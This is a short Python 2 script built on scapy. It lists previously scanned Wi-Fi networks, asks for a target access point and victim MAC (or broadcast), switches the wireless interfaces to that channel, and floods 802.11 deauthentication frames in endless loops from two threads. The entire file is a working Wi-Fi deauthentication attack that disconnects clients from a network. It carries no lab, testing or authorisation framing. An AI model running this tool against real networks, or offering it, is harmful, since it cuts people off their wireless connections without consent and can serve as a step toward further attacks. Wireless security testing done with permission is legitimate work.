from scapy.all import *
import shelve 
import sys
import os
from threading import Thread

def main():
	interface = "mon0"
	s = shelve.open("wireless_data.dat")
	print "Seq", "\tBSSID\t\t", "\tChannel", "SSID"
	keys= s.keys()
	list1 = []
	for each in keys:
		list1.append(int(each))
		list1.sort()
	for key in list1:
		key = str(key)
		print key,"\t",s[key][0],"\t",s[key][1],"\t",s[key][2]
	s.close()

	a = raw_input("Enter the seq number of wifi ")
	r = shelve.open("wireless_data.dat")
	print "Are you Sure to attack on ", r[a][0]," ",r[a][2]
	victim_mac = raw_input("Enter the victim MAC or for broadcast press 0 \t")
	if victim_mac=='0':
		victim_mac ="FF:FF:FF:FF:FF:FF"

	cmd1 = "iwconfig wlan1 channel "+str(r[a][1])
	cmd2 = "iwconfig mon0 channel "+str(r[a][1])
	os.system(cmd1)
	os.system(cmd2)


	BSSID = r[a][0]
	frame= RadioTap()/ Dot11(addr1=BSSID,addr2=victim_mac, addr3=BSSID)/ Dot11Deauth()
	frame1= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()


	if victim_mac!="FF:FF:FF:FF:FF:FF":
		t1 = Thread(target=for_ap, args=(frame,interface))
		t1.start()
	t2 = Thread(target=for_client, args=(frame1,interface))
	t2.start()


def for_ap(frame,interface):
	while True:
		sendp(frame, iface=interface, count=20, inter=.001)

def for_client(frame,interface):
	while True:
		sendp(frame, iface=interface, count=20, inter=.001)


if __name__ == '__main__':
	main()
